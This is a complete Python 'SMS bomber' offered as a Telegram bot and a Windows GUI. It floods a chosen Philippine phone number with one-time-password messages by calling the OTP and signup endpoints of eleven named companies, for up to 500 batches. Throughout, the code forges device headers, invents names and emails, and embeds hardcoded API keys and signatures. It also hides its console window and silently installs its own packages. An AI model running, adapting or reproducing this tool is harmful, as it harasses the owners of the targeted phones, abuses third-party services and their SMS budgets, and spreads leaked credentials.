#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SMS Bomber Pro v5.3 — Telegram Bot + Windows GUI hybrid
Changes: command /attack renamed to /sms, max batches capped at 500.
Channel: https://t.me/RastafaWorldwide
"""

import sys
import os
import subprocess
import threading
import time
import random
import string
import re
import webbrowser
import asyncio

if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass


def _pip_install(pkg):
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--disable-pip-version-check"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return True
    except Exception:
        return False


for mod, pkg in [
    ("aiohttp", "aiohttp"),
    ("customtkinter", "customtkinter"),
    ("telegram", "python-telegram-bot==20.7"),
]:
    try:
        __import__(mod)
    except ImportError:
        _pip_install(pkg)

import aiohttp

try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
    TG_AVAILABLE = True
except Exception:
    TG_AVAILABLE = False

try:
    import customtkinter as ctk
    from tkinter import messagebox
    GUI_AVAILABLE = True
except Exception:
    GUI_AVAILABLE = False


MAX_BATCHES = 500   # hard cap


class Engine:
    def __init__(self):
        self.ok = 0
        self.fail = 0
        self.stop = False
        self.sem = asyncio.Semaphore(8)

    def norm(self, p: str) -> str:
        p = re.sub(r"[\s\-\(\)]", "", p)
        if p.startswith("+63"): return p
        if p.startswith("63") and len(p) == 12: return "+" + p
        if p.startswith("0") and len(p) == 11: return "+63" + p[1:]
        if p.startswith("9") and len(p) == 10: return "+63" + p
        return p

    def local(self, p: str) -> str:
        return self.norm(p).replace("+63", "").lstrip("0")

    def valid(self, p: str) -> bool:
        c = re.sub(r"[\s\-\(\)]", "", p)
        return bool(re.match(r"^(09\d{9}|9\d{9}|\+639\d{9}|639\d{9})$", c))

    def rnd(self, n=8):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

    async def post(self, session, url, headers=None, json=None, data=None):
        async with self.sem:
            try:
                kw = {"headers": headers or {}, "timeout": aiohttp.ClientTimeout(total=10)}
                if json is not None: kw["json"] = json
                elif data is not None: kw["data"] = data
                async with session.post(url, **kw) as r:
                    return r.status in (200, 201, 202, 204)
            except Exception:
                return False

    async def ezloan(self, s, n):
        h = {"User-Agent": "okhttp/4.9.2", "Content-Type": "application/json",
             "device": "android", "source": "EZLOAN", "appversion": "2.0.4"}
        p = {"businessId": "EZLOAN", "contactNumber": n,
             "appsflyerIdentifier": f"{int(time.time())}-{random.randint(100000,999999)}"}
        return await self.post(s, "https://gateway.ezloancash.ph/security/auth/otp/request", headers=h, json=p)

    async def xpress(self, s, n, i):
        p = {"FirstName": "Juan", "LastName": "Cruz",
             "Email": f"u{int(time.time())}_{i}@gmail.com",
             "Phone": self.norm(n), "Password": "Pass1234!", "ConfirmPassword": "Pass1234!",
             "FingerprintVisitorId": self.rnd(18),
             "FingerprintRequestId": f"{int(time.time()*1000)}.{self.rnd(6)}"}
        h = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json"}
        return await self.post(s, "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", headers=h, json=p)

    async def abenson(self, s, n):
        d = f"contact_no={n}&login_token=undefined"
        h = {"User-Agent": "okhttp/4.9.0", "Content-Type": "application/x-www-form-urlencoded"}
        return await self.post(s, "https://api.mobile.abenson.com/api/public/membership/activate_otp", headers=h, data=d)

    async def excellent(self, s, n):
        c = random.choice([{"lat": "14.5995", "long": "120.9842"}, {"lat": "14.6760", "long": "121.0437"}])
        p = {"domain": n, "cat": "login", "previous": False, "financial": "efe35521e51f924efcad5d61d61072a9"}
        h = {"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json",
             "x-latitude": c["lat"], "x-longitude": c["long"]}
        return await self.post(s, "https://api.excellenteralending.com/dllin/union/rehabilitation/dock", headers=h, json=p)

    async def fortune(self, s, n):
        p = {"deviceId": f"{self.rnd(8)}-{self.rnd(4)}-{self.rnd(4)}-{self.rnd(4)}-{self.rnd(12)}",
             "deviceType": "GOOGLE_PLAY", "companyId": "4bf735e97269421a80b82359e7dc2288",
             "dialCode": "+63", "phoneNumber": self.local(n)}
        h = {"User-Agent": "Dart/3.6 (dart:io)", "Content-Type": "application/json",
             "app-type": "GOOGLE_PLAY", "app-version": "4.3.5",
             "timestamp": str(int(time.time()*1000)), "nonce": f"{self.rnd(10)}-{int(time.time()*1000)}"}
        return await self.post(s, "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register", headers=h, json=p)

    async def wemove(self, s, n):
        p = {"phone_country": "+63", "phone_no": self.local(n)}
        h = {"User-Agent": "okhttp/4.9.3", "Content-Type": "application/json", "source": "customer"}
        return await self.post(s, "https://api.wemove.com.ph/auth/users", headers=h, json=p)

    async def lbc(self, s, n):
        d = (f"verification_type=mobile&client_email={self.rnd(8)}@gmail.com"
             f"&client_contact_code=%2B63&client_contact_no={self.local(n)}&app_log_uid={self.rnd(16)}")
        h = {"User-Agent": "Dart/2.19 (dart:io)", "Content-Type": "application/x-www-form-urlencoded"}
        return await self.post(s, "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification", headers=h, data=d)

    async def pickup(self, s, n):
        p = {"mobile_number": self.norm(n), "login_method": "mobile_number"}
        h = {"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json"}
        return await self.post(s, "https://production.api.pickup-coffee.net/v2/customers/login", headers=h, json=p)

    async def honey(self, s, n):
        p = {"phone": self.norm(n), "is_rights_block_accepted": 1}
        h = {"User-Agent": "Mozilla/5.0 (Linux; Android 15)", "Content-Type": "application/json"}
        return await self.post(s, "https://api.honeyloan.ph/api/client/registration/step-one", headers=h, json=p)

    async def komo(self, s, n):
        p = {"mobile": self.norm(n), "transactionType": 6}
        h = {"Content-Type": "application/json",
             "Signature": "ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==",
             "Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba"}
        return await self.post(s, "https://api.komo.ph/api/otp/v5/generate", headers=h, json=p)

    async def s5(self, s, n):
        phone = self.norm(n)
        b = "----WebKitFormBoundary4wi4VH3ZsWtBXCct"
        body = f"--{b}\r\nContent-Disposition: form-data; name=\"phone_number\"\r\n\r\n{phone}\r\n--{b}--\r\n"
        h = {"content-type": f"multipart/form-data; boundary={b}",
             "origin": "https://www.s5.com", "referer": "https://www.s5.com/",
             "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
             "x-api-type": "external", "x-locale": "en",
             "x-public-api-key": "d6a6d988-e73e-4402-8e52-6df554cbfb35"}
        return await self.post(s, "https://api.s5.com/player/api/v1/otp/request", headers=h, data=body)

    async def attack(self, number, batches, log, prog, stats):
        self.ok = self.fail = 0
        self.stop = False
        connector = aiohttp.TCPConnector(limit=24, limit_per_host=8, ssl=False)
        timeout = aiohttp.ClientTimeout(total=14)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for i in range(1, batches + 1):
                if self.stop:
                    log("⏹  Stopped\n")
                    break
                log(f"▶  Batch {i}/{batches}\n")
                tasks = [
                    self.ezloan(session, number), self.xpress(session, number, i),
                    self.abenson(session, number), self.excellent(session, number),
                    self.fortune(session, number), self.wemove(session, number),
                    self.lbc(session, number), self.pickup(session, number),
                    self.honey(session, number), self.komo(session, number),
                    self.s5(session, number)
                ]
                res = await asyncio.gather(*tasks, return_exceptions=True)
                good = sum(1 for r in res if r is True)
                bad = len(tasks) - good
                self.ok += good
                self.fail += bad
                log(f"     ✓ {good}   ✗ {bad}\n")
                prog(i / batches)
                stats(self.ok, self.fail)
                await asyncio.sleep(random.uniform(0.5, 1.3))
        log("\n✅  Finished\n")


# ═══════════════════════════════════════════════════════════════════
#  TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED_USERS = {
    int(x) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip().isdigit()
}

_running: dict = {}


def _authorized(update):
    if not ALLOWED_USERS:
        return True
    u = update.effective_user
    return bool(u and u.id in ALLOWED_USERS)


async def cmd_start(update, ctx):
    if not _authorized(update):
        await update.message.reply_text("⛔ Access denied.")
        return
    text = (
        "⚡  *SMS BOMBER PRO — BOT*\n\n"
        "Commands:\n"
        "/sms `<number>` `<batches>` — start SMS attack (max 500)\n"
        "/stop — stop current attack\n"
        "/status — show current stats\n"
        "/id — show your Telegram user id\n\n"
        "Number formats:\n"
        "`09123456789`  `9123456789`  `+639123456789`\n\n"
        "Batches: 1–500 (max)"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_id(update, ctx):
    await update.message.reply_text(f"Your user id: `{update.effective_user.id}`", parse_mode="Markdown")


async def cmd_sms(update, ctx):
    if not _authorized(update):
        await update.message.reply_text("⛔ Access denied.")
        return

    chat_id = update.effective_chat.id
    if chat_id in _running and not _running[chat_id]["task"].done():
        await update.message.reply_text("⚠️ Attack already running in this chat. Use /stop first.")
        return

    args = ctx.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /sms `<number>` `[batches]`  (max 500)", parse_mode="Markdown")
        return

    number = args[0]
    try:
        batches = int(args[1]) if len(args) > 1 else 50
        batches = max(1, min(batches, MAX_BATCHES))
    except ValueError:
        batches = 50

    eng = Engine()
    if not eng.valid(number):
        await update.message.reply_text("⛔ Invalid number. Formats: 09123456789 / 9123456789 / +639123456789")
        return

    status_msg = await update.message.reply_text(
        f"🚀 Starting SMS attack\nTarget: `{number}`\nBatches: `{batches}` (max {MAX_BATCHES})",
        parse_mode="Markdown"
    )

    state = {"last": 0.0, "ok": 0, "fail": 0}

    def bot_log(t: str):
        stripped = t.strip()
        if not stripped:
            return
        if stripped.startswith(("▶", "⏹", "✅", "     ✓")):
            now = time.time()
            if now - state["last"] < 1.2:
                return
            state["last"] = now
            try:
                asyncio.get_event_loop().create_task(
                    status_msg.edit_text(
                        f"📡 *Running*\n{stripped}\n\n"
                        f"✓ `{state['ok']}`   ✗ `{state['fail']}`",
                        parse_mode="Markdown"
                    )
                )
            except Exception:
                pass

    def bot_prog(v: float):
        pass

    def bot_stats(o: int, f: int):
        state["ok"], state["fail"] = o, f

    async def runner():
        try:
            await eng.attack(number, batches, bot_log, bot_prog, bot_stats)
        finally:
            try:
                await status_msg.edit_text(
                    f"✅ *Finished*\nTarget: `{number}`\nBatches: `{batches}`\n\n"
                    f"✓ `{state['ok']}`   ✗ `{state['fail']}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

    task = asyncio.create_task(runner())
    _running[chat_id] = {"engine": eng, "task": task}
    await update.message.reply_text("Use /status or /stop at any time.")


async def cmd_stop(update, ctx):
    if not _authorized(update):
        await update.message.reply_text("⛔ Access denied.")
        return
    chat_id = update.effective_chat.id
    rec = _running.get(chat_id)
    if not rec or rec["task"].done():
        await update.message.reply_text("ℹ️ No attack running.")
        return
    rec["engine"].stop = True
    await update.message.reply_text("⏹ Stopping...")


async def cmd_status(update, ctx):
    if not _authorized(update):
        await update.message.reply_text("⛔ Access denied.")
        return
    chat_id = update.effective_chat.id
    rec = _running.get(chat_id)
    if not rec:
        await update.message.reply_text("ℹ️ No attack registered in this chat.")
        return
    eng = rec["engine"]
    state_txt = "done" if rec["task"].done() else "running"
    await update.message.reply_text(
        f"📊 *Status:* `{state_txt}`\n"
        f"✓ Success: `{eng.ok}`\n"
        f"✗ Failed:  `{eng.fail}`",
        parse_mode="Markdown"
    )


# ═══════════════════════════════════════════════════════════════════
#  GUI
# ═══════════════════════════════════════════════════════════════════
if GUI_AVAILABLE:
    ctk.set_appearance_mode("Dark")
    ctk.set_default_color_theme("blue")

    class App(ctk.CTk):
        def __init__(self):
            super().__init__()
            self.title("SMS Bomber Pro  •  RastafaWorldwide")
            self.geometry("860x680")
            self.minsize(800, 600)
            self.configure(fg_color="#0a0e14")
            self.resizable(True, True)

            self.update_idletasks()
            x = (self.winfo_screenwidth() - 860) // 2
            y = (self.winfo_screenheight() - 680) // 2
            self.geometry(f"+{x}+{y}")

            self.engine = Engine()
            self._build()

        def _build(self):
            head = ctk.CTkFrame(self, height=68, fg_color="#11161d", corner_radius=0)
            head.pack(fill="x")
            head.pack_propagate(False)
            ctk.CTkLabel(head, text="⚡  SMS BOMBER PRO",
                         font=ctk.CTkFont("Segoe UI", 22, "bold"),
                         text_color="#64b5f6").pack(side="left", padx=22, pady=16)
            ctk.CTkButton(head, text="📢  Telegram",
                          width=135, height=34,
                          fg_color="#0088cc", hover_color="#00a0e3",
                          font=ctk.CTkFont(size=13, weight="bold"),
                          corner_radius=9,
                          command=lambda: webbrowser.open("https://t.me/RastafaWorldwide")
                          ).pack(side="right", padx=22, pady=15)

            body = ctk.CTkFrame(self, fg_color="transparent")
            body.pack(fill="both", expand=True, padx=18, pady=14)

            left = ctk.CTkFrame(body, width=295, fg_color="#11161d",
                                corner_radius=16, border_width=1, border_color="#1e2630")
            left.pack(side="left", fill="y", padx=(0, 12))
            left.pack_propagate(False)

            ctk.CTkLabel(left, text="TARGET NUMBER",
                         font=ctk.CTkFont(size=11, weight="bold"),
                         text_color="#6b7a8d").pack(anchor="w", padx=18, pady=(20, 3))

            self.phone = ctk.CTkEntry(left, placeholder_text="09123456789",
                                      height=42, font=ctk.CTkFont(size=15),
                                      fg_color="#0a0e14", border_color="#2a3441",
                                      border_width=1, corner_radius=10)
            self.phone.pack(fill="x", padx=18, pady=(0, 14))

            ctk.CTkLabel(left, text=f"BATCHES (1-{MAX_BATCHES})",
                         font=ctk.CTkFont(size=11, weight="bold"),
                         text_color="#6b7a8d").pack(anchor="w", padx=18, pady=(0, 3))

            self.batches = ctk.CTkEntry(left, placeholder_text="50",
                                        height=42, font=ctk.CTkFont(size=15),
                                        fg_color="#0a0e14", border_color="#2a3441",
                                        border_width=1, corner_radius=10)
            self.batches.pack(fill="x", padx=18, pady=(0, 20))
            self.batches.insert(0, "50")

            self.btn_go = ctk.CTkButton(left, text="▶   START SMS",
                                        height=46, font=ctk.CTkFont(size=15, weight="bold"),
                                        fg_color="#00c853", hover_color="#00e676",
                                        text_color="#000000", corner_radius=10,
                                        command=self.start)
            self.btn_go.pack(fill="x", padx=18, pady=(0, 8))

            self.btn_stop = ctk.CTkButton(left, text="⏹   STOP",
                                          height=42, font=ctk.CTkFont(size=14, weight="bold"),
                                          fg_color="#ff1744", hover_color="#ff5252",
                                          corner_radius=10, state="disabled",
                                          command=self.stop)
            self.btn_stop.pack(fill="x", padx=18, pady=(0, 20))

            card = ctk.CTkFrame(left, fg_color="#0a0e14", corner_radius=12,
                                border_width=1, border_color="#1e2630")
            card.pack(fill="x", padx=18, pady=(0, 14))

            ctk.CTkLabel(card, text="LIVE STATS",
                         font=ctk.CTkFont(size=11, weight="bold"),
                         text_color="#6b7a8d").pack(anchor="w", padx=14, pady=(12, 6))

            self.lbl_ok = ctk.CTkLabel(card, text="✓  Success   0",
                                       font=ctk.CTkFont(size=14), text_color="#00e676")
            self.lbl_ok.pack(anchor="w", padx=14)

            self.lbl_fail = ctk.CTkLabel(card, text="✗  Failed    0",
                                         font=ctk.CTkFont(size=14), text_color="#ff5252")
            self.lbl_fail.pack(anchor="w", padx=14, pady=(2, 12))

            self.bar = ctk.CTkProgressBar(left, height=11,
                                          progress_color="#64b5f6",
                                          fg_color="#1e2630", corner_radius=5)
            self.bar.pack(fill="x", padx=18, pady=(0, 5))
            self.bar.set(0)

            self.lbl_pct = ctk.CTkLabel(left, text="0 %",
                                        font=ctk.CTkFont(size=12), text_color="#6b7a8d")
            self.lbl_pct.pack(pady=(0, 16))

            right = ctk.CTkFrame(body, fg_color="#11161d", corner_radius=16,
                                 border_width=1, border_color="#1e2630")
            right.pack(side="right", fill="both", expand=True)

            ctk.CTkLabel(right, text="LIVE LOG",
                         font=ctk.CTkFont(size=11, weight="bold"),
                         text_color="#6b7a8d").pack(anchor="w", padx=16, pady=(14, 5))

            self.logbox = ctk.CTkTextbox(right, font=ctk.CTkFont("Consolas", 13),
                                         fg_color="#0a0e14", text_color="#b0bec5",
                                         border_color="#1e2630", border_width=1,
                                         corner_radius=10, wrap="word")
            self.logbox.pack(fill="both", expand=True, padx=14, pady=(0, 14))
            self.logbox.insert("end", "Ready.\n\nEnter number → press START SMS\n\nTelegram: https://t.me/RastafaWorldwide\n")
            self.logbox.configure(state="disabled")

            foot = ctk.CTkFrame(self, height=34, fg_color="#11161d", corner_radius=0)
            foot.pack(fill="x", side="bottom")
            foot.pack_propagate(False)
            ctk.CTkLabel(foot, text="https://t.me/RastafaWorldwide   •   v5.3  Bot+GUI Edition",
                         font=ctk.CTkFont(size=12), text_color="#4a5568").pack(pady=7)

        def write(self, t):
            try:
                self.logbox.configure(state="normal")
                self.logbox.insert("end", t)
                self.logbox.see("end")
                self.logbox.configure(state="disabled")
            except Exception:
                pass

        def set_prog(self, v):
            try:
                self.bar.set(v)
                self.lbl_pct.configure(text=f"{int(v*100)} %")
            except Exception:
                pass

        def set_stats(self, o, f):
            try:
                self.lbl_ok.configure(text=f"✓  Success   {o}")
                self.lbl_fail.configure(text=f"✗  Failed    {f}")
            except Exception:
                pass

        def start(self):
            phone = self.phone.get().strip()
            if not self.engine.valid(phone):
                messagebox.showerror("Invalid Number",
                                     "Formats:\n\n09123456789\n9123456789\n+639123456789")
                return
            try:
                n = int(self.batches.get().strip() or "50")
                n = max(1, min(n, MAX_BATCHES))
            except ValueError:
                n = 50

            self.btn_go.configure(state="disabled")
            self.btn_stop.configure(state="normal")
            self.set_prog(0)
            self.set_stats(0, 0)

            self.logbox.configure(state="normal")
            self.logbox.delete("1.0", "end")
            self.logbox.configure(state="disabled")
            self.write(f"Target   →  {phone}\nBatches  →  {n} (max {MAX_BATCHES})\n\n")

            def worker():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(
                        self.engine.attack(
                            phone, n,
                            log=lambda t: self.after(0, self.write, t),
                            prog=lambda v: self.after(0, self.set_prog, v),
                            stats=lambda o, f: self.after(0, self.set_stats, o, f)
                        )
                    )
                except Exception as e:
                    self.after(0, self.write, f"\nError: {e}\n")
                finally:
                    loop.close()
                    self.after(0, self.finished)

            threading.Thread(target=worker, daemon=True).start()

        def stop(self):
            self.engine.stop = True
            self.write("⏹  Stopping...\n")

        def finished(self):
            self.btn_go.configure(state="normal")
            self.btn_stop.configure(state="disabled")


# ═══════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════
def run_bot():
    if not TG_AVAILABLE:
        print("[!] python-telegram-bot not installed.")
        return
    if not BOT_TOKEN:
        print("[!] BOT_TOKEN env var not set.")
        return
    print("[*] Starting Telegram bot...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CommandHandler("sms", cmd_sms))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    print("[*] Bot polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


def main():
    if BOT_TOKEN:
        run_bot()
    elif GUI_AVAILABLE:
        try:
            app = App()
            app.mainloop()
        except Exception as e:
            try:
                import tkinter as tk
                from tkinter import messagebox as mb
                root = tk.Tk(); root.withdraw()
                mb.showerror("SMS Bomber Pro Error", str(e))
            except Exception:
                print("Error:", e)
                input("Press Enter...")
    else:
        print("[!] No BOT_TOKEN and no GUI available. Nothing to run.")


if __name__ == "__main__":
    main()
